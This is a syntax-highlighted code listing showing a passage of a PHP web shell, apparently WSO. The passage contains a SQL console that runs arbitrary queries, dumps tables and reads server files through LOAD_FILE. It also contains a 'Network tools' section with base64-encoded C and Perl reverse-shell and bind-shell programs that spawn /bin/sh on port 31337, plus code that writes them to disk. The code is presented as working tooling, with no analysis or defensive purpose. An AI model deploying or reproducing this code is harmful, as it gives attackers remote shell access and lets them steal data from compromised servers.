<span class="lineno">1258</span>             <span class="p">}</span> 
<span class="lineno">1259</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;/select&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1260</span>         <span class="p">}</span> 
<span class="lineno">1261</span>         <span class="k">else</span> <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span> 
<span class="lineno">1262</span>     <span class="p">}</span><span class="k">else</span> 
<span class="lineno">1263</span>         <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span> 
<span class="lineno">1264</span>     <span class="cp">?&gt;</span><span class="x">&lt;/td&gt; </span>
<span class="lineno">1265</span> <span class="x">                &lt;td&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/td&gt; </span>
<span class="lineno">1266</span> <span class="x">            &lt;/tr&gt; </span>
<span class="lineno">1267</span> <span class="x">        &lt;/table&gt; </span>
<span class="lineno">1268</span> <span class="x">        &lt;script&gt; </span>
<span class="lineno">1269</span> <span class="x">            function st(t,l) { </span>
<span class="lineno">1270</span> <span class="x">                document.sf.p1.value = &#39;select&#39;; </span>
<span class="lineno">1271</span> <span class="x">                document.sf.p2.value = t; </span>
<span class="lineno">1272</span> <span class="x">                if(l!=null)document.sf.p3.value = l; </span>
<span class="lineno">1273</span> <span class="x">                document.sf.submit(); </span>
<span class="lineno">1274</span> <span class="x">            } </span>
<span class="lineno">1275</span> <span class="x">            function is() { </span>
<span class="lineno">1276</span> <span class="x">                for(i=0;i&lt;document.sf.elements[&#39;tbl[]&#39;].length;++i) </span>
<span class="lineno">1277</span> <span class="x">                    document.sf.elements[&#39;tbl[]&#39;][i].checked = !document.sf.elements[&#39;tbl[]&#39;][i].checked; </span>
<span class="lineno">1278</span> <span class="x">            } </span>
<span class="lineno">1279</span> <span class="x">        &lt;/script&gt; </span>
<span class="lineno">1280</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno">1281</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">){</span> 
<span class="lineno">1282</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&lt;table width=100% cellpadding=2 cellspacing=0&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1283</span>             <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">])){</span> 
<span class="lineno">1284</span>                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span> 
<span class="lineno">1285</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td width=1 style=&#39;border-top:2px solid #666;border-right:2px solid #666;&#39;&gt;&lt;span&gt;Tables:&lt;/span&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1286</span>                 <span class="nv">$tbls_res</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">listTables</span><span class="p">();</span> 
<span class="lineno">1287</span>                 <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nv">$tbls_res</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno">1288</span>                     <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno">1289</span>                     <span class="nv">$n</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">));</span> 
<span class="lineno">1290</span>                     <span class="nv">$value</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span> 
<span class="lineno">1291</span>                     <span class="k">echo</span> <span class="s2">&quot;&lt;nobr&gt;&lt;input type=&#39;checkbox&#39; name=&#39;tbl[]&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;&gt;&amp;nbsp;&lt;a href=# onclick=</span><span class="se">\&quot;</span><span class="s2">st(&#39;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&#39;)</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt; (&quot;</span><span class="o">.</span><span class="nv">$n</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)&lt;/nobr&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1292</span>                 <span class="p">}</span> 
<span class="lineno">1293</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;input type=&#39;checkbox&#39; onclick=&#39;is();&#39;&gt; &lt;input type=button value=&#39;Dump&#39; onclick=&#39;document.sf.p2.value=</span><span class="se">\&quot;</span><span class="s2">download</span><span class="se">\&quot;</span><span class="s2">;document.sf.submit();&#39;&gt;&lt;/td&gt;&lt;td style=&#39;border-top:2px solid #666;&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1294</span>                 <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;select&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1295</span>                     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;query&#39;</span><span class="p">;</span> 
<span class="lineno">1296</span>                     <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT COUNT(*) as n FROM &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">);</span> 
<span class="lineno">1297</span>                     <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span> 
<span class="lineno">1298</span>                     <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$num</span><span class="p">[</span><span class="s1">&#39;n&#39;</span><span class="p">];</span> 
<span class="lineno">1299</span>                     <span class="k">echo</span> <span class="s2">&quot;&lt;span&gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/span&gt; (</span><span class="si">$num</span><span class="s2">) &quot;</span><span class="p">;</span> 
<span class="lineno">1300</span>                     <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="p">(</span><span class="nv">$num</span><span class="o">/</span><span class="mi">30</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> 
<span class="lineno">1301</span>                         <span class="k">if</span><span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> 
<span class="lineno">1302</span>                             <span class="k">echo</span> <span class="s2">&quot;&lt;a href=&#39;#&#39; onclick=&#39;st(</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, </span><span class="si">$i</span><span class="s2">)&#39;&gt;&quot;</span><span class="p">,(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span><span class="s2">&quot;&lt;/a&gt; &quot;</span><span class="p">;</span> 
<span class="lineno">1303</span>                         <span class="k">else</span> 
<span class="lineno">1304</span>                             <span class="k">echo</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span><span class="s2">&quot; &quot;</span><span class="p">;</span> 
<span class="lineno">1305</span>                     <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span> 
<span class="lineno">1306</span>                         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; LIMIT 30 OFFSET &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">);</span> 
<span class="lineno">1307</span>                     <span class="k">else</span> 
<span class="lineno">1308</span>                         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;` LIMIT &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;,30&#39;</span><span class="p">;</span> 
<span class="lineno">1309</span>                     <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1310</span>                 <span class="p">}</span> 
<span class="lineno">1311</span>                 <span class="k">if</span><span class="p">((</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;query&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno">1312</span>                     <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span> 
<span class="lineno">1313</span>                     <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1314</span>                         <span class="nv">$title</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1315</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;table width=100% cellspacing=0 cellpadding=2 class=main&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1316</span>                         <span class="nv">$line</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> 
<span class="lineno">1317</span>                         <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span>    <span class="p">{</span> 
<span class="lineno">1318</span>                             <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$title</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1319</span>                                 <span class="k">echo</span> <span class="s1">&#39;&lt;tr&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1320</span>                                 <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> 
<span class="lineno">1321</span>                                     <span class="k">echo</span> <span class="s1">&#39;&lt;th&gt;&#39;</span><span class="o">.</span><span class="nv">$key</span><span class="o">.</span><span class="s1">&#39;&lt;/th&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1322</span>                                 <span class="nb">reset</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno">1323</span>                                 <span class="nv">$title</span><span class="o">=</span><span class="k">true</span><span class="p">;</span> 
<span class="lineno">1324</span>                                 <span class="k">echo</span> <span class="s1">&#39;&lt;/tr&gt;&lt;tr&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1325</span>                                 <span class="nv">$line</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> 
<span class="lineno">1326</span>                             <span class="p">}</span> 
<span class="lineno">1327</span>                             <span class="k">echo</span> <span class="s1">&#39;&lt;tr class=&quot;l&#39;</span><span class="o">.</span><span class="nv">$line</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1328</span>                             <span class="nv">$line</span> <span class="o">=</span> <span class="nv">$line</span><span class="o">==</span><span class="mi">1</span><span class="o">?</span><span class="mi">2</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> 
<span class="lineno">1329</span>                             <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1330</span>                                 <span class="k">if</span><span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="k">null</span><span class="p">)</span> 
<span class="lineno">1331</span>                                     <span class="k">echo</span> <span class="s1">&#39;&lt;td&gt;&lt;i&gt;null&lt;/i&gt;&lt;/td&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1332</span>                                 <span class="k">else</span> 
<span class="lineno">1333</span>                                     <span class="k">echo</span> <span class="s1">&#39;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1334</span>                             <span class="p">}</span> 
<span class="lineno">1335</span>                             <span class="k">echo</span> <span class="s1">&#39;&lt;/tr&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1336</span>                         <span class="p">}</span> 
<span class="lineno">1337</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;/table&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1338</span>                     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
<span class="lineno">1339</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;div&gt;&lt;b&gt;Error:&lt;/b&gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1340</span>                     <span class="p">}</span> 
<span class="lineno">1341</span>                 <span class="p">}</span> 
<span class="lineno">1342</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;textarea name=&#39;p3&#39; style=&#39;width:100%;height:100px&#39;&gt;&quot;</span><span class="o">.@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=submit value=&#39;Execute&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1343</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1344</span>             <span class="p">}</span> 
<span class="lineno">1345</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&lt;/form&gt;&lt;br/&gt;&lt;form onsubmit=&#39;document.sf.p1.value=</span><span class="se">\&quot;</span><span class="s2">loadfile</span><span class="se">\&quot;</span><span class="s2">;document.sf.p2.value=this.f.value;document.sf.submit();return false;&#39;&gt;&lt;span&gt;Load file&lt;/span&gt; &lt;input  class=&#39;toolsInp&#39; type=text name=f&gt;&lt;input type=submit value=&#39;&gt;&gt;&#39;&gt;&lt;/form&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1346</span>             <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;loadfile&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1347</span>                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT LOAD_FILE(&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;) as file&quot;</span><span class="p">);</span> 
<span class="lineno">1348</span>                 <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span> 
<span class="lineno">1349</span>                 <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=ml1&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
<span class="lineno">1350</span>             <span class="p">}</span> 
<span class="lineno">1351</span>     <span class="p">}</span> 
<span class="lineno">1352</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1353</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno">1354</span> <span class="p">}</span> 
<span class="lineno">1355</span> <span class="k">function</span> <span class="nf">actionNetwork</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1356</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno">1357</span>     <span class="nv">$back_connect_c</span><span class="o">=</span><span class="s2">&quot;I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9&quot;</span><span class="p">;</span> 
<span class="lineno">1358</span>     <span class="nv">$back_connect_p</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7&quot;</span><span class="p">;</span> 
<span class="lineno">1359</span>     <span class="nv">$bind_port_c</span><span class="o">=</span><span class="s2">&quot;I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9&quot;</span><span class="p">;</span> 
<span class="lineno">1360</span>     <span class="nv">$bind_port_p</span><span class="o">=</span><span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=&quot;</span><span class="p">;</span> 
<span class="lineno">1361</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno">1362</span> <span class="x">    &lt;h1&gt;Network tools&lt;/h1&gt;&lt;div class=content&gt; </span>
<span class="lineno">1363</span> <span class="x">    &lt;form name=&#39;nfp&#39; onSubmit=&quot;g(null,null,this.using.value,this.port.value,this.pass.value);return false;&quot;&gt; </span>
<span class="lineno">1364</span> <span class="x">    &lt;span&gt;Bind port to /bin/sh&lt;/span&gt;&lt;br/&gt; </span>
<span class="lineno">1365</span> <span class="x">    Port: &lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&gt; Password: &lt;input type=&#39;text&#39; name=&#39;pass&#39; value=&#39;wso&#39;&gt; Using: &lt;select name=&quot;using&quot;&gt;&lt;option value=&#39;bpc&#39;&gt;C&lt;/option&gt;&lt;option value=&#39;bpp&#39;&gt;Perl&lt;/option&gt;&lt;/select&gt; &lt;input type=submit value=&quot;&gt;&gt;&quot;&gt; </span>
<span class="lineno">1366</span> <span class="x">    &lt;/form&gt; </span>
<span class="lineno">1367</span> <span class="x">    &lt;form name=&#39;nfp&#39; onSubmit=&quot;g(null,null,this.using.value,this.server.value,this.port.value);return false;&quot;&gt; </span>
<span class="lineno">1368</span> <span class="x">    &lt;span&gt;Back-connect to&lt;/span&gt;&lt;br/&gt; </span>
<span class="lineno">1369</span> <span class="x">    Server: &lt;input type=&#39;text&#39; name=&#39;server&#39; value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; Port: &lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;31337&#39;&gt; Using: &lt;select name=&quot;using&quot;&gt;&lt;option value=&#39;bcc&#39;&gt;C&lt;/option&gt;&lt;option value=&#39;bcp&#39;&gt;Perl&lt;/option&gt;&lt;/select&gt; &lt;input type=submit value=&quot;&gt;&gt;&quot;&gt; </span>
<span class="lineno">1370</span> <span class="x">    &lt;/form&gt;&lt;br&gt; </span>
<span class="lineno">1371</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno">1372</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno">1373</span>         <span class="k">function</span> <span class="nf">cf</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1374</span>             <span class="nv">$w</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="o">@</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;file_put_contents&#39;</span><span class="p">);</span> 
<span class="lineno">1375</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1376</span>                 <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">))</span> <span class="k">or</span> <span class="o">@</span><span class="nb">fputs</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">))</span> <span class="k">or</span> <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$t</span><span class="p">));</span> 
<span class="lineno">1377</span>                 <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$w</span><span class="p">);</span> 
<span class="lineno">1378</span>             <span class="p">}</span> 
<span class="lineno">1379</span>         <span class="p">}</span> 
